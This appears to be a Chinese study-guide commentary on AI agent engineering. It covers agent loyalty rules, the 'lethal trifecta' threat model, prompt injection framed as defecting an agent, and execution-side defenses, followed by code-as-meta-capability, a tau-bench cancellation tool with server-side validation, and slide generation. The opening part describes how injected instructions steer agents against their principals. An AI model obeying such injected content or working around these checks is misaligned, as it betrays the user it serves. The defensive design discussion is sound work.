原文给的忠诚度守则里有两条特别精妙，值得展开。一条是「拒绝时不逐条念出拒绝清单（那本身就在泄露）」，它针对的是一种很自然的模型行为：被要求做某事时，为了显得有帮助和透明，它会说「这件事我不能做，但我可以做 A、B、C，只要不涉及 XX 就没问题」。问题在于，拒绝清单本身描述了边界在哪，而这些边界信息恰恰是谈判对手最想知道的。正确的做法是干巴巴地拒绝，不给边界信息。另一条是「甚至不泄露这些信息是否存在」，这比上一条更进一层：不仅不能说内容，连「我有这个信息」都不能承认，因为「是否存在」本身就有价值，对手会知道该往哪个方向施压。

「两端都翻车的跷跷板」这个观察，是这一节最实在的工程提醒。它的含义是，忠诚度没法当成一个可以单调优化的标量（「越忠诚越好」），它更像一个需要权衡的区间：太松会泄密，太紧会拒绝正当请求。所以调优要的是找到一个两边都不出事的区间，不必把参数量调到头。原文说「很难两全」，是一种诚实的表述：这类对齐问题目前没有一劳永逸的解，只能靠系统提示里写清楚的守则加上实测校准。

「提示注入本质上就是一次策反」这个说法能站住，是因为两者的结构完全一样：都是「一个非授权方试图让 Agent 执行有利于自己、不利于主人（或系统）的动作」。区别只在手段，谈判对手用话术施压，注入攻击用藏在内容里的指令。把它们看成同一类问题，好处是可以用同一套机制防御：明确「谁是指令来源、谁是数据来源」的优先级排序。原文那句「一切来自外部交互方的内容都默认降格为『可参考、但不具备指令效力』的数据」，就是这套优先级的具体表述，它也是第二、四章反复出现的「内容与指令分离」原则在忠诚度问题上的重述。

最后把几组容易混的边界划清楚。

致命三要素与四类边界：三要素是能力维度，说的是 Agent 有什么本事（读私有数据、看不受信内容、对外通信）；四类边界是风险边界（数据边界、输入信任边界、输出影响边界、跨会话边界）。四类边界是原文在「三要素 + 持久记忆」之上做的重述与扩展，其中「跨会话边界」对应新增的持久记忆这一项。

输入过滤与执行面防御：前者试图在入口识别并拦掉恶意内容（原文明确说「单靠输入过滤基本挡不住」），后者承认入口拦不住，改为在危险动作真正执行的那一刻拦住（网络出口控制、命令语义解析、危险动作审批）。原文那句重点判断说的就是从前一类防御转向后一类。

网络出口控制与文件系统隔离都是沙盒层面的兜底，挡的方向相反。文件系统隔离挡的是读取和数据破坏，不让 Agent 看到凭证、不让它改真实代码；网络出口控制挡的是外送，不让读到的数据发出去。原文把它们并列为「隔离兜底」的两个维度，说明两侧都要防。

委托方忠诚与提示注入：原文明确说「提示注入本质上就是一次策反」，但两者不是同一个概念。提示注入是攻击手法，把指令藏在内容里；委托方忠诚是 Agent 的立场问题，在多方利益冲突时该听谁的。后者的范围更大，即使没有任何注入，一个在多轮施压下就抖出主人底价的 Agent，也是忠诚度出了问题。

关键字黑名单与语义解析：前者是匹配，看文本里有没有这个字符串；后者是理解，看这条命令最终会做什么。原文给的判据很清楚，因为 Shell 有管道、子 shell、变量展开这些组合能力，任何静态的字符串规则都能被绕过，所以必须升到语义层。

致命三要素（读私有数据、看不受信内容、能对外通信）一旦闭合，攻击就成立，所以落到防御上，与其想办法认全所有攻击，不如把这条通路掐断。Coding Agent 还要额外防住命令伪装、代码执行逃逸和跨会话记忆投毒，并对「为谁效忠」给出明确立场。

## 5.2 代码：通用 Agent 的元能力

5.1 讲的是怎么搭一个可靠的 Coding Agent，从架构设计到工具实现再到 Harness 工程。但代码生成的价值不止于写程序。原文在这里给「元能力」下了定义：普通能力是 Agent 能做某件具体的事，回答一个问题、调一个 API、生成一段文字；**元能力（meta-capability）** 则是能创造其他能力的能力，Agent 用它当场写出新工具、新约束、新表达形式来完成任务，不必事先把所有能力都预制好。代码生成正是这样的元能力，因为它精确、可执行、可组合，能产出三类东西：新工具（脚本、API 调用序列）、新约束（断言、校验规则）、新的表达形态（HTML 表单、PPT、视频帧）。

「当场」和「不必事先预制」是这一定义的关键词。普通的工具能力有个隐含前提：设计者在部署前就得想到这个能力会被用到，并且把它做出来。开放任务里这是硬约束，你没法预先枚举所有可能用到的工具，5.1.2 讲适用边界时说的就是这个。元能力绕开了它，Agent 不需要「有」这个工具，只需要会造这个工具。能力集合从固定的变成可扩展的，这是本章最重要的一次视角转换。

三个性质缺一不可。代码如果模糊，就没法消除自然语言推理的不确定性，5.2.1 的数学题靠的正是这一点。代码如果只是「描述」而不「运行」，它就只是另一份文档，约束力等同于文字建议，5.2.2 的核心论点正在这里：要么成功运行，要么抛出错误，不存在模棱两可。代码如果没法和其他能力拼起来，就只能解决孤立的小问题；函数调用、管道、模块导入让它层层叠加，5.2.4 的「万能胶」和 5.2.5 里 SQL 加可视化两个 artifact 组成的流水线都靠这个。

接下来六节展示这种元能力在编程之外的六个方向。原文特意说明这六个方向有一根轴线，按「元能力作用对象」由内向外组织：

| 顺序 | 作用对象 | 方向名 | 原文的一句话说明 |
| --- | --- | --- | --- |
| 1 | 思维本身 | 思考工具 | 用代码替代易错的自然语言推理 |
| 2 | 业务规则 | 业务规则约束 | 把模糊的政策编码为可执行约束 |
| 3 | 内容呈现 | 多媒体生成 | 生成 PPT、视频与可视化产物 |
| 4 | 系统接口 | 系统适配器 | 桥接异构 API，自动适应数据格式演化 |
| 5 | 用户界面 | 生成式 UI | 动态构造表单与交互界面 |
| 6 | Agent 自身 | Agent 自举 | 用代码创造或修复新 Agent，形成自举 |

这个顺序不是修辞上的安排，它是一条抽象层级递增的轴线：第一个方向管 Agent 自己怎么想，第二个管规则怎么写，第三个管东西怎么呈现给人，第四个管怎么连上别人的系统，第五个管界面怎么给用户用，第六个管怎么造出下一个 Agent。越往后，作用对象的范围越大，离 Agent 自身越远。六节读下来会发现一个共同结构，每一节讲的都是「某个环节原来靠自然语言、GUI 或人工，现在改由代码承担」。

## 5.2.1 代码作为思考工具

LLM 在自然语言理解和生成上表现惊人，精确计算、符号操作、严格逻辑推导却是根本短板。原文给的原因只有一句，但很到位：模型思考本质上是概率性的、近似的，而数学和逻辑问题要求确定性的、精确的答案。

原文用一个具体对比来说明。题目是：「一个班有 40 名学生，其中 60% 选修了数学，45% 选修了物理，25% 两门都选了。只选了物理没选数学的有多少人？」

纯自然语言推理（容易出错）：

```
"60% 选数学 = 24 人，
 45% 选物理 = 18 人，
 25% 都选 = 10 人，
 只选物理 = 24 - 10 = 14 人"
→ 误从数学人数中减，答案错误
```

代码推理（精确可验证）：

```python
math = int(40 * 0.60)   # 24
phys = int(40 * 0.45)   # 18
both = int(40 * 0.25)   # 10
only_phys = phys - both # 8
print(only_phys)        # 8 ✓
```

正确答案是 8，也就是物理 18 人减去两门都选的 10 人。自然语言推理给出的 14 是从数学人数 24 里减掉了 10，把「只选物理」错算成了「只选数学」。这个错误很典型，24−10=14 本身没算错，错在语义指代，模型在多步文字推理里把两个集合的身份搞混了。代码版本没有犯这个错，靠的是变量名把身份钉死了：`only_phys = phys - both`，这里的 `phys` 明明白白是物理人数，不存在「可以从数学人数里减」的可能性。这就是形式化消除歧义的样子，同一个意思自然语言有一百种写法因而可能被误读，代码只有一种写法因而无从误读。

为什么模型不擅长精确计算？模型生成每一个 token 都是在给定前文的条件下从分布里采样，它学到的是「数字通常怎么搭配」的统计规律，并没有掌握算术规则本身。训练数据里常见的形式（小整数乘法）它答得很准，不常见的形式（大数、多步进位、特殊结构）就容易出错，因为它在回忆见过的算式像不像，并没有在执行运算。这也解释了 Chain-of-Thought 为什么能提升准确率：更多的中间步骤给了它更多「像见过的算式」的机会。但这不是根本解决，中间状态仍然是采样的，错误依然会累积。代码解释器一执行，每一步都是确定性的，错误不再累积。原文的结论是让 LLM 负责理解问题并写出代码，让代码解释器负责精确计算，这种分工让两者各司其职。

Mathematica 创始人 Stephen Wolfram 对这个局面有深刻洞察。他回顾的是 LLM 出现之前就存在的一类系统：它们用**符号计算（Symbolic Computation）** 的方式工作，用数学符号而非近似数值处理表达式。普通计算器会把 √2 算成 1.414，符号计算系统则保持 √2 的精确形式，只在需要时才转成小数。Wolfram 创建的 Wolfram Alpha 就是这样一个系统，用户输入数学问题，它返回精确答案；可它的自然语言理解相当脆弱、覆盖面也窄，因为它依赖一套内置的语法解析，能识别的问法有限，问法稍作改变就可能解析失败，更无法处理开放域的多步推理。

两个短板正好互补：LLM 擅长理解各种自然语言表达，不擅长精确计算。由此原文给出新的协同模式：让 LLM 负责理解用户的自然语言问题，识别其中的数学或逻辑结构，转化为形式化语言（如 Mathematica 语言或 Python 的 SymPy 库）；然后交给专门的符号计算引擎或约束求解器执行，获得精确结果。

这段洞察的分量在于它指出的是一个历史事实：「精确计算」和「理解自然语言」在 LLM 出现之前由两套完全不同的系统分别承担。符号计算系统负责前者，做得极好却听不懂人话；自然语言系统（早期对话系统、搜索引擎）负责后者，能听懂却算不准。两套系统各有各的硬约束，符号计算系统的瓶颈在输入接口，必须先把自然语言翻译成它认识的形式语言，这一步靠人工写的语法解析，所以问法稍作改变就可能解析失败；语言系统的瓶颈在推理内核。

新协同模式的妙处是把两个瓶颈各交给对方补上。LLM 补的是符号计算系统的输入接口，它天然擅长把各种自然语言表达翻译成形式化语言；符号计算引擎补的是 LLM 的推理内核，它天然提供确定性。这里接口用的形式化语言，原文点名 Mathematica 语言或 Python 的 SymPy，都具备精确、无歧义、可执行这三个特点，又正好是 LLM 在训练数据里见过大量样例的东西，语法结构也规整。

SymPy 和「把 √2 算成 1.414」那个例子，可以用来说明「精确」到底是什么意思。用浮点数算 √2 × √2，得到的是 1.9999999999999998 这类近似值，因为 √2 本身无法用有限位小数表示，每一步都引入了舍入误差；符号计算系统里 `√2 × √2` 会直接化简成 `2`，它处理的对象是符号表达式，只在最后需要输出一个数时才转成小数。对数学题来说这个区别是致命的：一道题如果答案就是「√2」，你算出 1.4142135 就对不上标准答案；如果题目涉及的是不等式或整数性质，浮点误差甚至可能让判断翻转。

### 实验 5-3 ★★：使用代码生成工具提升数学解题能力

实验目标是验证 Agent 通过 Code Interpreter 辅助数学思考的准确性提升。技术方案是给 Agent 配一个安装了 sympy、numpy、scipy 等数学库的 Python 沙盒，遇到数学问题时把它形式化为 Python 代码：sympy 进行符号计算（微积分、方程求解），scipy 进行数值优化，numpy 进行矩阵运算，生成的代码在沙盒中执行并返回精确结果。验收用 AIME 风格题目（对标美国数学邀请赛）评测，对比纯思维链思考和代码辅助思考的准确率，要求代码辅助模式显著更高，同时检查代码是否正确使用数学库、求解过程是否逻辑清晰。

#### 实验 5-4 ★★：使用代码生成工具提升逻辑思考能力

实验目标是评估 Agent 通过约束求解代码辅助逻辑思考的能力。技术方案是给 Agent 配一个包含 python-constraint 库的 Code Interpreter，Agent 把逻辑谜题（如骑士与无赖问题）转化为形式化约束定义：识别所有变量（每个岛民身份）、约束条件（「骑士说真话」等推导），定义约束并调用求解器搜索满足所有约束的解。验收标准是使用 K&K Puzzle 数据集评测，代码辅助模式求解准确率达 90% 以上，显著高于纯思考模式。

两个实验的分工值得留意。5-3 用 sympy/scipy/numpy 解决数值与符号计算问题（微积分、方程求解、数值优化、矩阵运算），5-4 用 python-constraint 解决约束满足问题（把逻辑谜题翻译成变量加约束再加求解器）。它们有一处共同点：都有现成的、确定性的求解器，模型只需要负责把问题翻译成求解器能读的输入。这个模式可以推广，凡是存在「形式化输入 → 确定输出」的成熟工具的领域，都能让 LLM 退回到它最擅长的翻译角色。

实验还揭示了一条更普遍的规律：模型与脚手架（harness）之间是此消彼长的关系。模型足够强时，脚手架可以更薄，模型自己就能把逻辑想对，代码求解器带来的增益随之收窄；模型不够强时，就得在脚手架里做更多事情，把关键的逻辑推理交给代码和约束求解器来保证正确性。原文还交代了实验设计的用意：正因如此，这个实验刻意选用能力较弱的模型来放大对照。在较弱的模型上，纯思考模式会频繁算错，代码辅助能把准确率显著拉高；换成足够强的思考模型，纯思考往往就能解出全部谜题，代码辅助的增益便收敛到接近零。所以脚手架该做多厚，取决于你手上模型的能力边界。

这也是评估一项 Agent 技术时容易被忽视的前提：同一套脚手架，配上不同能力的模型，得到的结论可能截然不同。工程上容易犯的评估错误就在这里，拿最强的模型去测「加代码求解器有没有用」，很可能测出「没什么用」，因为强模型纯思考也能做对，然后得出「代码辅助价值有限」的结论，而这个结论只对那个模型成立，换成小模型就完全不成立。它和 5.1.4 的说法是同一件事的两面：能不能稳定运行往往不取决于用了多强的模型，而取决于围绕 Agent 搭建的基础设施有多扎实。模型能力与 Harness 厚度是可以互相替代的两种资源。工程含义很清楚，小模型加厚 Harness 往往比大模型加薄 Harness 更便宜，前提是 Harness 里放的是求解器、校验器这类确定性的东西，不是又一层概率性的猜测。

几处容易混的地方理一下。自然语言推理（CoT）和代码推理的区别在于计算发生在哪里：前者让模型把中间步骤写出来，每一步仍然是概率采样，能减少但不能消除错误；后者让模型写程序交给确定性的解释器执行，执行阶段完全没有误差。符号计算和数值计算也常被混为一谈，前者用数学符号处理表达式、保留 √2 的精确形式，后者用浮点数近似（√2 → 1.414）；SymPy 是符号计算库，numpy 主要是数值计算库，实验 5-3 里两者并用，分工就是「能用符号就用符号、需要数值优化再上数值库」。

工具调用（tool use）和代码生成（code generation）在 5.2.1 的语境里差在通用性。给 Agent 一个「解方程」工具，它只能解方程；给一个代码解释器，它能现场写出解方程、约束求解、画图、数据处理的任意代码。这就是元能力与普通能力在机制上的区别：元能力没有把更多能力塞进工具箱，它让工具箱不必预先装满。

最后一个容易读错的地方：代码辅助的增益在强模型上收敛到接近零，不等于强模型不需要代码解释器。它只是不需要解释器帮它算对，仍然需要解释器去执行它写出来的代码，比如真去跑一段数据分析。收窄的是正确性方面的边际收益，不是能力范围上的替代。

### 5.2.2 代码作为业务规则的约束

这一节是对前面 Harness 工程的直接回应。Harness 的核心原则之一是「约束：编码化而非文档化」，把规则从自然语言文档转化为可执行的代码，使它成为系统行为的强制约束而非建议性指南。代码生成使 Agent 能够自主完成这个转化过程。

自然语言的歧义是固有的。业务规则、办事流程、决策逻辑如果仅用自然语言描述，往往充满歧义。原文举的追问是：什么是「合理的退款请求」？什么算「紧急情况」？这些概念的边界在自然语言中很难界定。「购买后 7 天内可退款」看似清楚，可「7 天」是自然日还是工作日？「购买」是下单时间还是发货时间？相比之下，代码提供的是无歧义、可执行的知识表达方式，要么成功运行，要么抛出错误，不存在模棱两可。

两种做法是互补关系，原文明确说了这一点，并分别列出优势。把规则写在系统提示词里，模型可以基于规则向用户解释政策，可以根据规则寻找变通方案（比如「改签而非取消」），也可以在调用工具前初步判断可行性。把规则编码成校验工具，代码逻辑具有精确性和无歧义性，不会出现理解偏差；代码执行具有确定性，相同输入必产生相同输出；处理复杂规则组合尤其合适，多条件布尔组合、时间计算、跨数据源验证都能覆盖。实践中的建议是结合使用：系统提示词包含自然语言规则供理解和沟通，关键决策点配备代码化校验工具当「守门员」确保合规。

代码化规则真正的价值不在优化 token 效率，而在防止不可逆的错误操作。取消订单、转出资金、删除数据，这些操作一旦执行就无法撤销。代码化校验在操作前设下最后一道防线，这种安全保障的价值远超它的实现成本。

关于校验和执行的合并，原文的设计主张是：与其设计独立校验工具，不如让执行工具内部先校验。它拿 τ-bench（tau-bench，一个模拟航空、电商客服场景，专门评测 Agent 工具调用与政策遵守能力的基准测试）中的航空公司取消政策做例子：

```python
def cancel_reservation(
    reservation_id: str,
    cancellation_reason: str,
    # "change_of_plan", "airline_cancelled", "other"
    expected_cabin_class: str = None,
    # 可选：模型自查用，服务端以数据库真值复核
    expected_has_insurance: bool = None
    # 可选：模型自查用，同上
) -> dict:
    """
    取消航班预订。
    取消政策（服务端根据数据库真值强制执行）：
    - 规则1: 已使用任何航段的订单不可取消
    - 规则2: 预订后24 小时内可无条件取消
    - 规则3: 航空公司取消的航班总可取消
    - 规则4: 商务舱总可取消
    - 规则5: 基础经济舱和经济舱需购买旅行保险才可取消
    调用前请先查询订单详情，逐条核对上述政策；expected_* 参数用于
    陈述你的判断依据，仅供服务端比对与审计，不影响政策裁决。
    """
    # 所有政策事实一律从数据库读取，绝不采信模型自报的值
    r = db.get_reservation(reservation_id)
    now = server_clock.now()   # 服务端时钟，而非模型提供

    # 模型自报值与真值不一致时记录告警，用于发现模型的错误认知或潜在注入
    if expected_cabin_class is not None and expected_cabin_class != r.cabin_class:
        log_mismatch(reservation_id, "cabin_class", expected_cabin_class, r.cabin_class)
    if expected_has_insurance is not None and expected_has_insurance != r.has_insurance:
        log_mismatch(reservation_id, "has_insurance", expected_has_insurance, r.has_insurance)

    if r.any_segment_used:
        return {"success": False, "reason": "Cannot cancel with used segments"}
    hours_since_booking = (now - r.booking_time).total_seconds() / 3600
    if hours_since_booking < 0:
        return {"success": False, "reason": "Booking time is in the future"}
    if hours_since_booking <= 24:
        execute_cancellation(reservation_id)
        return {"success": True, "reason": "Cancelled within 24-hour window"}
    if r.flight_status == "cancelled_by_airline":
        execute_cancellation(reservation_id)
        return {"success": True, "reason": "Airline cancelled flight"}
    if r.cabin_class == "business":
        execute_cancellation(reservation_id)
        return {"success": True, "reason": "Business class cancellation"}
    if r.cabin_class in ["basic_economy", "economy"]:
        if r.has_insurance:
            execute_cancellation(reservation_id)
            return {"success": True, "reason": f"{r.cabin_class} with insurance"}
        return {"success": False, "reason": f"{r.cabin_class} requires insurance"}
    return {"success": False, "reason": "Does not meet cancellation policy"}
```

这段代码要分两部分读。签名部分除了 `reservation_id` 和 `cancellation_reason` 两个必要的业务参数，还有两个可选参数 `expected_cabin_class`、`expected_has_insurance`，注释明确标注它们是「模型自查用，服务端以数据库真值复核」。文档字符串是工具描述，把完整的五条取消政策列了出来，并要求模型「调用前请先查询订单详情，逐条核对上述政策」，同时声明 `expected_*` 参数「用于陈述你的判断依据，仅供服务端比对与审计，不影响政策裁决」。函数体里，`r = db.get_reservation(reservation_id)` 从数据库取订单，`now = server_clock.now()` 取服务端时钟，注释强调「所有政策事实一律从数据库读取，绝不采信模型自报的值」；模型自报的 `expected_*` 与数据库真值不一致时调用 `log_mismatch` 记录告警，用途是「发现模型的错误认知或潜在注入」；接下来按规则 1 到规则 5 依次判断，每次允许取消都调用 `execute_cancellation(reservation_id)` 真正执行。

规则那几行的细节值得对上：已使用航段直接拒绝；预订时间在未来直接拒绝，这是异常数据兜底；24 小时内无条件取消；航空公司取消的航班可取消；商务舱可取消；基础经济舱和经济舱需要保险，有保险则取消、无保险则拒绝；其余情况按「不符合取消政策」拒绝。

原文指出这个设计的价值要分两层来看。第一层是参数作为思考的 checklist。工具描述中列出了完整的取消政策并要求模型调用前逐条核对，可选的 `expected_*` 参数进一步促使模型把自己的判断依据显式写出来。为了填好这些参数，模型必须先调用查询工具获取订单详情，逐一确认每个条件，填写参数的过程本质上是一个强制性 checklist。原文举的例子是：当模型查到舱位是经济舱且未购保险时，很可能在准备调用的过程中就注意到规则 5，从而根本不会发起调用，而是直接告诉用户「经济舱未购保险无法取消，可考虑购买保险后再取消或改签」。这一层的价值在于引导思考、减少无效调用，但它不承担安全责任，`expected_*` 参数只是模型的自我陈述，服务端从不把它当作事实。

第二层是服务端真值校验，这才是守门员。舱位等级、保险状态、预订时间、航段使用情况、航班状态，全部由服务端查询数据库获得，当前时间来自服务端时钟，没有任何一条政策事实来自模型自报的参数。原文解释了这不是多余的谨慎：模型可能产生幻觉，也可能被提示注入操纵，正如前文「致命三要素」所分析的，同一上下文中的 Agent 难以自证清白。反证也很直接，如果把 `cabin_class`、`has_insurance` 乃至 `current_time` 设计成由模型填写的参数，模型只要报错（或被诱导报错）一个值，「守门员」就形同虚设。由此得出的原则是，最后一道防线必须建立在模型无法伪造的数据之上。这与前文「关键操作需要独立验证」的立场一脉相承，独立性不仅指独立的模型，更指独立的数据来源。

「独立性不仅指独立的模型，更指独立的数据来源」这句是整节的核心，它把独立验证从一个维度扩到了两个维度。平时说关键操作需要独立验证，通常想的是换个模型来复核；可如果复核者依赖的信息本身来自被复核者，换模型也没用。在这段代码里，被复核的其实是「模型提供的政策事实是否可信」，答案是不信，全部查库。这个原则可以推广到任何地方：安全校验的输入必须来自被校验方触及不到的通道。

为什么「让执行工具内部先校验」优于「设计一个独立的校验工具」？这个主张容易读过去，工程含义却不小。独立校验工具的路子是模型先调 `check_cancellation_policy(...)`，得到「可以取消」，再调 `cancel_reservation(...)`。风险在于这一步是模型自愿的，它完全可能跳过校验直接调用执行工具，未必出于恶意，只是「觉得没问题」，所以这类校验的安全性依赖模型自觉。执行工具内置校验就不同了，校验是执行路径上的必经环节，不通过校验就执行不了，安全性不依赖模型的行为。这正是 5.1.4「约束优先于指导」的机制版解释：把校验放进「做不了」的位置，不要放在「建议先做」的位置。

`expected_*` 这个参数的设计很巧妙，值得单独拆解。它用一个参数同时服务两个目的，而作者用一句注释把它们严格分开了。对模型而言，它是思考的脚手架：为了填这个参数，模型必须先去查订单、确认舱位、确认保险状态，填写动作本身就是核对动作。这是用接口设计引导行为，比在提示词里写「请务必先核对政策」可靠得多，提示词是建议，而必填参数是语法要求，模型不填就写不出合法的调用。对服务端而言，它是审计信号：服务端根本不拿它做裁决，注释里明说了「不影响政策裁决」，只拿真值比对一下，不一致就记一条告警。这条告警有两个用途，一是发现模型的错误认知（模型一直以为经济舱都能退，说明它对政策的理解有问题，可以去修提示词），二是发现潜在注入（模型的判断突然和真值系统性偏离，可能是被注入了）。

这两个目的必须严格分开，否则就出问题。服务端一旦采信 `expected_*`，它就是一条可被模型伪造的输入，回到「守门员形同虚设」；如果只为审计而不告诉模型「填了也不会被采信」，模型可能为了「让调用通过」而迎合性地填一个它认为服务端想看的答案，所以文档字符串里那句话是必要的。

规则 1 到规则 5 的判定顺序在代码里是有意为之的。为什么「24 小时内可无条件取消」排在「航空公司取消」和「商务舱」之前？因为规则 2 是最宽的条件，无条件，越早判定越能覆盖更多情况；「已使用航段不可取消」放在最前，因为它是唯一的绝对否决条件，其他所有规则都救不回来。这五条的排列体现的是否决优先、宽条件在前的判定策略，既保证绝对禁止的规则不被绕过，又让返回的 `reason` 尽可能准确地反映是「哪条规则让它通过的」。这个细节在真实的风控实现里很常见，读代码时值得留意。

代码里还有一个容易被忽略的兜底检查：`if hours_since_booking < 0: return ... "Booking time is in the future"`。它防的是数据异常。如果数据库里的 `booking_time` 是未来时间，`hours_since_booking` 会是负数，而负数 `< 24` 会让它意外满足「24 小时内可无条件取消」。这条检查处理的是「数据不可信」，不是「用户不可信」。真正的守门员逻辑要防的不只是模型，还有脏数据、时钟漂移、并发写入这些基础设施层面的意外。

三重保障由此完整：系统提示词的自然语言规则帮助理解和解释；工具描述与参数设计作为 checklist，引导模型在调用前显式核对条件；服务端基于数据库真值的代码化校验作为最后守门员。它们的分工是两层防发生、一层防后果。第一层成本最低，作用是沟通，用户问「为什么不能退」时模型能解释；第二层成本也低，作用是减少无效调用，很多违规操作在模型准备参数阶段就被自己发现并劝阻了，根本到不了服务端；第三层成本最高，要写代码、要维护政策逻辑，但它是唯一一道能在模型判断完全错误时仍然生效的防线。原文用一句话概括了三层的关系：「前两重减少错误的发生，第三重确保错误不会变成不可逆的损失。」「不可逆」这个词划定了第三层的适用范围，如果这个操作可以撤销，比如给用户发一条提示消息，第三层就不必这么重；反过来，取消订单、转出资金、删除数据这类操作，第三层的成本再高也值得付。

#### 实验 5-5 ★★：小模型通过代码化知识提升执行规则的准确性

实验目标是验证小参数量模型（Qwen3-4B）通过代码化业务规则显著提升复杂政策执行的准确性和一致性。技术方案基于 τ-bench 航空客服场景设计对照实验。控制组用纯自然语言规则，依赖模型自身思考。实验组是三重保障：系统提示词保留自然语言规则；工具描述列出完整政策，并用可选的 `expected_*` 参数引导模型调用前逐条核对（checklist）；工具内部基于模拟数据库真值做代码化校验，政策事实一律查库获取、时间取服务端时钟、不采信模型自报参数。评测指标是任务成功率、政策违规次数、无效工具调用次数、用户体验。预期实验组显著优于控制组，更重要的是观察到模型在准备参数时就自主识别违规操作，直接向用户提议替代方案，从而验证「参数作为 checklist」的有效性；同时统计 `expected_*` 自报值与数据库真值不一致的比例，验证「服务端真值校验」拦截错误认知的必要性。

特意选 Qwen3-4B 这样的小模型，和 5.2.1 的实验 5-4 是同一个方法论：用弱模型放大脚手架的增益。这个选择本身就是实验结论的一部分，它说明代码化规则这类技术对能力较弱的模型价值最大。原因是自然语言规则要求模型自己想清楚、自己记得住、自己在该用的时候想起来，这三步对弱模型都不容易；代码化校验把这三步都外部化了，精确性交给代码，记忆交给数据库，触发时机交给执行路径。落到工程实践上：如果你打算用小模型做业务 Agent，Harness 的厚度就是你的安全边际。

还有几处对照容易搞混。自然语言规则与代码化规则是互补而非替代，前者擅长理解、解释、找变通方案、调用前初判，价值在沟通和灵活性；后者擅长精确、确定、复杂组合，价值在强制和安全。checklist 参数与真值校验在同一个函数里，信任级别却完全不同：`expected_*` 是模型的自我陈述，服务端只用来比对和审计，从不采信；真值校验读的是数据库和服务器时钟，是模型无法伪造的。把这两者混起来，比如让服务端用 `expected_cabin_class` 做判断，就等于把守门员交给了被审计方。独立模型与独立数据源是独立验证的两个维度，换模型解决的是同一个模型的系统性偏差，换数据源解决的是输入被污染，后者更根本。

`log_mismatch` 的作用也需要和拒绝执行分开看。它不阻止任何操作，只是记录「模型的认知与真值不一致」，价值在运行时的可观测性：如果某天告警突然变多，可能意味着提示词失效了、模型换了、或者有人在做注入。别把「记录告警」理解成一种安全机制，真正的安全机制是后面那串 if 判断。至于它和 5.1.4「约束优先于指导」的关系，两者说的是同一件事而层次不同，5.1.4 讲的是原则，能用代码强制的就不要用文档建议；本节讲的是实现形态，一个带真值校验的执行工具。本节开头也承认了这个关系。

### 5.2.3 代码驱动的多媒体生成

原文先给出本节的一般原理：许多复杂文档的创作本质上是结构化数据的组织和呈现。演示文稿、技术报告、交互式应用，底层都由代码定义，HTML 描述结构，CSS 控制样式，JavaScript 实现交互。传统的文档创作依赖 GUI 界面的所见即所得编辑，这种方式对 Agent 既不直观也不高效，因为 GUI 操作需要视觉理解和精确的坐标定位。通过代码生成，Agent 绕开了视觉定位难题，获得对文档的精确控制能力，每个元素的位置、样式、内容都是明确定义的，可以用程序化的方式修改和优化。

这个判断的理由值得接着说。GUI 操作要求 Agent 精确输出鼠标坐标，工程上极不稳定，分辨率一变、窗口大小一变、主题一变，坐标就全错；代码里每个元素的位置、样式、内容都是显式声明的，可确定、可复现、可版本管理。代码还有一个好处是可增量修改，改布局只需要改一个属性，不需要重新「点」一遍。

PPT 创作往往耗时费力：一个典型的学术报告 PPT 可能包含数十页幻灯片，每页都需精心设计布局、提炼要点、选配图表。把它转化为代码生成问题就能极大降低复杂度。现代 PPT 框架（如 Slidev）采用的设计哲学是用 Markdown 和 HTML 定义演示内容，创建一页幻灯片只需编写简洁的标记语言，框架会自动处理渲染、布局和动画，这种方式对掌握了代码生成能力的 Agent 极其友好。

图 5-5（原文插图，题为「PPT 生成的提议者-审核者机制」）画的是两列协作结构：

| 角色 | 图中的输入/步骤 | 图中的输出/发现 |
| --- | --- | --- |
| Proposer Agent | 输入：论文/资料内容（`paper.pdf` → 提取章节/论点/图表） | 输出：Slidev Markdown（含 `layout: two-cols`、标题「Transformer 架构」、`::left::` 下「自注意力机制 / 多头注意力」、`::right::` 下 `<img src="fig3.png" />`） |
| Reviewer Agent | 步骤 1：渲染截图（`slidev export --per-slide` → `slide-01.png, slide-02.png ...`）；步骤 2：Vision LLM 审查 | 审查维度：文字是否溢出边界、布局是否拥挤、图片尺寸是否合适；发现的问题：Slide 3 内容过多，建议拆分；Slide 7 字体过小，增大到 14pt |

图中还标出 Reviewer 把修改建议回给 Slidev 代码，迭代 2-3 轮，并单独对比了为什么要把 Proposer 和 Reviewer 分开。单 Agent 的问题在于数十页渲染截图会让上下文膨胀，代码与截图混在一起又让注意力分散；分离之后的优势是 Reviewer 有独立上下文，只看截图加代码，Proposer 专注代码，只收修改建议；实际效果是上下文占用显著减少，修复准确率提升显著。

为什么必须分离？原文的论证是：仅能生成代码还不够，Agent 编写完代码后并不知道实际渲染效果，内容是否太挤、文字是否溢出、图片尺寸是否合适，这些只有真正渲染出来才能发现。所以需要引入**提议者-审核者（Proposer-Reviewer）机制**，把代码编写和质量评审解耦为两个独立 Agent。Proposer Agent 负责生成 Slidev 代码，理解内容逻辑结构并把它分解为合理的页面。Reviewer Agent 运行代码把每页渲染为图片，用 Vision LLM（能「看」懂图片的多模态大模型）从内容密度、可读性、布局合理性、视觉美感等维度分析渲染结果，生成结构化的改进建议。这里的要求是建议必须落到具体可执行的层面，比如「第 3 页：内容过多，建议拆分」「第 7 页：代码块字体过小，建议增大到 14pt」，不能停在「不好看」这种模糊说法上，建议里还要包含页码、问题类型、严重程度等字段。

这里点破了一个容易被忽视的事实：代码的正确性（能不能渲染出来）和效果的合格性（渲染出来好不好看）是两个不同的问题。前者可以用语法检查、编译、运行成功来判断，后者必须真的看一眼。而写代码的那个 Agent 恰恰做不到这件事，它没有视觉反馈，所以必须引入一个能看图的角色，而且这个角色掌握的是提议者看不到的新信息。

分离比单 Agent 轮流做两件事好在哪？原文给的两条理由都跟上下文有关。数十页 PPT 的多轮迭代如果全在一个上下文里，就要累积「第 1 轮的全部截图加第 2 轮的全部截图加……」，窗口很快就会塞满；分开之后 Reviewer 每次只看最新一版，历史版本的截图处理完就可以丢掉。另一个毛病是注意力分散，同一上下文里既有代码又有截图，模型要在两种模态、两种任务（写代码和挑毛病）之间来回切换；分开之后 Proposer 的上下文里只有结构化文本反馈，简短、清晰、易推理，Reviewer 的上下文里只有截图加当前代码，任务单一。这个启示挺通用：当两个子任务的输入模态不同、其中一个还会产生大量数据时，把它们拆到两个上下文里，收益往往大于协调成本。

